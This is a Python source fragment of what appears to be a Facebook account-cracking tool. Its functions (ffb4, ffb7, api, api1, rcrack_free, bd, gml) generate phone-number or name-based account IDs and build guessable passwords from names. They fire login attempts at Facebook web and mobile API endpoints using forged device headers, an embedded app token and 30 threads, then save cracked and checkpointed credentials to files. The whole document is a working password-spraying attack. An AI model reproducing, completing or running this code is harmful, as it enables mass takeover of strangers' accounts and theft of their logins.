                        head = {'Host': 'mbasic.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
                        getlog = session.get(f'https://free.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post(f'https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        Shahin=session.cookies.get_dict().keys()
                        if "c_user" in Shahin:
                                coki=session.cookies.get_dict()
                                kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print(f'\r\r\033[1;32m [Success] %s | %s'%(ids,pas))
                                open(f'/sdcard/Success.txt', 'a').write(ids+'|'+pas+'\n')
                                #cek_apk(session,coki)
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Shahin:
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[38;5;126m [Checkpoint] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/Checkpoint.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue
        except requests.exceptions.ConnectionError:
                time.sleep(20)
        loop+=1
xxxxx=(f"GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")
def ffb4(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [AXE] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(f' ')[0]
                try:
                        last = names.split(f' ')[1]
                except:
                        last = 'Ahmed'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
                        pas = fikr.replace(f'First',first).replace(f'Last',last).replace(f'first',ps).replace(f'last',ps2)
                        ua=random.choice(ugen)
                        head = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
                        getlog = session.get(f'https://p.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post(f'https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        Shahin=session.cookies.get_dict().keys()
                        if "c_user" in Shahin:
                                coki=session.cookies.get_dict()
                                kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print(f'\r\r\033[1;32m [Success] %s | %s'%(ids,pas))
                                open(f'/sdcard/Success.txt', 'a').write(ids+'|'+pas+'\n')
                                #cek_apk(session,coki)
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Shahin:
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[38;5;126m [Checkpoint] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/Checkpoint.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue
        except requests.exceptions.ConnectionError:
                time.sleep(20)
        loop+=1
xxxxx=(f"GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")

def api(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write(f'\r\r\033[1;37m [AXE %s|\033[1;32mSuccess:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(f' ')[0]
                        try:
                                ln = names.split(f' ')[1]
                        except:
                                ln = fn
                        for pw in passlist:
                                pas = pw.replace(f'first',fn.lower()).replace(f'First',fn).replace(f'last',ln.lower()).replace(f'Last',ln).replace(f'Name',names).replace(f'name',names.lower())
                                application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                application_version_code=str(random.randint(000000000,999999999))
                                fbs=random.choice(fbks)
                                gtt=random.choice(xxxxx)
                                gttt=random.choice(xxxxx)
                                android_version=str(random.randrange(6,13))
                                ua_string = f'Davik/2.1.0 (linex; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.0,width=720,height=1280};'+f'FBLC/en_US;FBRV/{str(application_version_code)};FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'adid':adid,
                                        'email':ids,
                                        'password':pas,
                                        'cpl':'true',
                                        'credentials_type':'device_based_login_password',
                                        "source": "device_based_login",
                                        'error_detail_type':'button_with_disabled',
                                        'source':'login','format':'json',
                                        'generate_session_cookies':'1',
                                        'generate_analytics_claim':'1',
                                        'generate_machine_id':'1',
                                        "locale":"en_US","client_country_code":"US",
                                        'device':gtt,
                                        'device_id':adid,
                                        "method": "auth.login",
                                        "fb_api_req_friendly_name": "authenticate",
                                        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
                                head = {
                                        'content-type':'application/x-www-form-urlencoded',
                                        'x-fb-sim-hni':str(random.randint(2e4,4e4)),
                                        'x-fb-connection-type':'unknown',
                                        'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                        'user-agent':ua_string,
                                        'x-fb-net-hni':str(random.randint(2e4,4e4)),
                                        'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
                                        'x-fb-connection-quality':'EXCELLENT',
                                        'x-fb-friendly-name':'authenticate',
                                        'accept-encoding':'gzip, deflate',
                                        'x-fb-http-engine':     'Liger'}
                                url = 'https://b-api.facebook.com/method/auth.login'
                                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print(f'\r\r\033[1;32m [Success] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/Success.txt','a').write(ids+'|'+pas+'\n')
                                        #cek_apk(session,coki)
                                        oks.append(ids)
                                        break
                                elif 'www.facebook.com' in q['error_msg']:
                                        if 'y' in pcp:
                                                print(f'\r\r\x1b[38;5;126m [Checkpoint] '+ids+' | '+pas+'\033[1;97m')
                                                open(f'/sdcard/Checkpoint.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                else:
                                        continue
                        loop+=1
                except requests.exceptions.ConnectionError:
                        time.sleep(10)
                except Exception as e:
                        pass
def api1(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write(f'\r\r\033[1;37m [AXE %s|\033[1;32mSuccess:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(f' ')[0]
                        try:
                                ln = names.split(f' ')[1]
                        except:
                                ln = fn
                        for pw in passlist:
                                pas = pw.replace(f'first',fn.lower()).replace(f'First',fn).replace(f'last',ln.lower()).replace(f'Last',ln).replace(f'Name',names).replace(f'name',names.lower())
                                application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                application_version_code=str(random.randint(000000000,999999999))
                                fbs=random.choice(fbks)
                                gtt=random.choice(xxxxx)
                                gttt=random.choice(xxxxx)
                                android_version=str(random.randrange(6,13))
                                ua_string = f'Davik/2.1.0 (linex; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.0,width=720,height=1280};'+f'FBLC/es_CU;FBRV/{str(application_version_code)};FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'adid':adid,
                                        'email':ids,
                                        'password':pas,
                                        'cpl':'true',
                                        'credentials_type':'device_based_login_password',
                                        "source": "device_based_login",
                                        'error_detail_type':'button_with_disabled',
                                        'source':'login','format':'json',
                                        'generate_session_cookies':'1',
                                        'generate_analytics_claim':'1',
                                        'generate_machine_id':'1',
                                        "locale":"es_CU","client_country_code":"CU",
                                        'device':gtt,
                                        'device_id':adid,
                                        "method": "auth.login",
                                        "fb_api_req_friendly_name": "authenticate",
                                        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
                                head = {
                                        'content-type':'application/x-www-form-urlencoded',
                                        'x-fb-sim-hni':str(random.randint(2e4,4e4)),
                                        'x-fb-connection-type':'unknown',
                                        'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                        'user-agent':ua_string,
                                        'x-fb-net-hni':str(random.randint(2e4,4e4)),
                                        'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
                                        'x-fb-connection-quality':'EXCELLENT',
                                        'x-fb-friendly-name':'authenticate',
                                        'accept-encoding':'gzip, deflate',
                                        'x-fb-http-engine':     'Liger'}
                                url = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
                                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print(f'\r\r\033[1;32m [Success] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/Success.txt','a').write(ids+'|'+pas+'\n')
                                        #cek_apk(session,coki)
                                        oks.append(ids)
                                        break
                                elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r\x1b[38;5;126m [Checkpoint] '+ids+' | '+pas+'\033[1;97m')
                                                open(f'/sdcard/Checkpoint.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                open(f'/sdcard/Checkpoint.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                else:
                                        continue
                        loop+=1
                except requests.exceptions.ConnectionError:
                        time.sleep(10)
                except Exception as e:
                        pass
def ffb7(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [AXE] %s|\033[1;32mSuccess:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(f' ')[0]
                try:
                        last = names.split(f' ')[1]
                except:
                        last = 'Ahmed'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
                        pas = fikr.replace(f'First',first).replace(f'Last',last).replace(f'first',ps).replace(f'last',ps2)
                        ua=random.choice(ugen)
                        head = {'Host': 'p.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
                        getlog = session.get(f'https://mobile.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post(f'https://mobile.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        Shahin=session.cookies.get_dict().keys()
                        if "c_user" in Shahin:
                                coki=session.cookies.get_dict()
                                kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print(f'\r\r\033[1;32m [Successful] %s | %s'%(ids,pas))
                                open(f'/sdcard/Success.txt', 'a').write(ids+'|'+pas+'\n')
                                #cek_apk(session,coki)
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Shahin:
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[38;5;126m [Checkpoint] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/Checkpoint.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue
        except requests.exceptions.ConnectionError:
                time.sleep(20)
        loop+=1
xxxxx=(f"GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")
#
def bd():
                user=[]
                pcp=[]
                clear()
                pcp.append(f'y')
                print('\033[1;32m Code example: 016,017,018,019')
                code = input('\033[1;37m put code: ')
                try:
                        limit = int(input('\033[1;32m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(8))
                        user.append(nmp)
                with tred(max_workers=30) as sat:     
                        clear()
                        tl = str(len(user))
                        print(' Total account : \033[1;32m'+tl)
                        print(f'\033[1;37m Choice code ..:\033[1;32m '+code)
                        print(f'\033[1;32m Random Version ..... ')
                        print(f'\033[1;37m \x1b[38;5;126m Prosess started\033[1;97m')
                        linex()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'bangladesh','i love you','@#@#@#','123890']
                                sat.submit(apix,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total Successful/Checkpoint: '+str(len(oks))+'/'+str(len(cps)))

def gml():
                user=[]
                pcp=[]
                clear()
                pcp.append(f'y')
                print('\033[1;32m Name  example:  Shahin, Axel, Formatkomamamo ')
                code = input(' First name : ')
                print(' Name Example : Alam, hossen, hossain')
                codex = input(' Last name : ')
                try:
                        limit = int(input('\033[1;32m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(2,5))
                        user.append(nmp)
                with tred(max_workers=30) as sat:     
                        clear()
                        tl = str(len(user))
                        print(' Total account : \033[1;32m'+tl)
                        print(f'\033[1;37m Choice code ..:\033[1;32m '+code)
                        print(f'\033[1;32m Random Version ..... ')
                        print(f'\033[1;37m \x1b[38;5;126m Prosess has started please wait\033[1;97m')
                        linex()
                        for psx in user:
                                ids = code+codex+psx
                                passlist = [code,codex,code+codex,code+' '+codex,code+'123',code+'1234',code+'12345','@#@#@#','123890']
                                sat.submit(apix,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total Successfull/Checkpoint: '+str(len(oks))+'/'+str(len(cps)))





def rcrack_free(idf,pwv):
	#print(user)
	global loop
	global cps
	global oks
	global agents
	try:
		for ps in pwv:
	#		print(idf+'|'+ps)
			#session = requests.Session()
			sys.stdout.write(f'\r\r\033[1;37m [AXE] %s|\033[1;32mSuccessfull:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
			session = requests.Session()
			pro = random.choice(useragent)
			free_fb = session.get('https://m.alpha.facebook.com').text
			log_data = {
				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
			"try_number":"0",
			"unrecognized_tries":"0",
			"email":idf,
			"pass":ps,
			"login":"Log In"}
			header_freefb = {'authority': 'd.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'cache-control': 'max-age=0',
    # 'cookie': 'datr=oBr6Y3Tm21Fw7v9-6INTj3Am; sb=oBr6Y9l-3ZpGwWZeWS_gjFQw; m_pixel_ratio=1.8000000715255737; wd=600x1114; fr=07gak6HnUCJP9c1Bl..Bj-hqg.d6.AAA.0.0.Bj-hrE.AWUH5u2BpxQ',
    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': pro}
			lo = session.post('https://m.alpha.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
			log_cookies=session.cookies.get_dict().keys()
			#print(iid+'|'+pws+'|'+str(log_cookies))
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[151:166]
				print('\n')
				print('\033[1;92m[Successful] '+idf+' | '+ps+'\033[0;97m')
				cek_apk(coki)
				open('ok.txt', 'a').write(idf+' | '+ps+'\n')
				oks.append(idf)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\n')
				print('\033[1;91m[Checkpoint] '+idf+' | '+ps+'\033[0;97m')
				open('cp.txt', 'a').write(idf+' | '+ps+'\n')
				cps.append(idf)
				break
			else:
				continue
		loop+=1
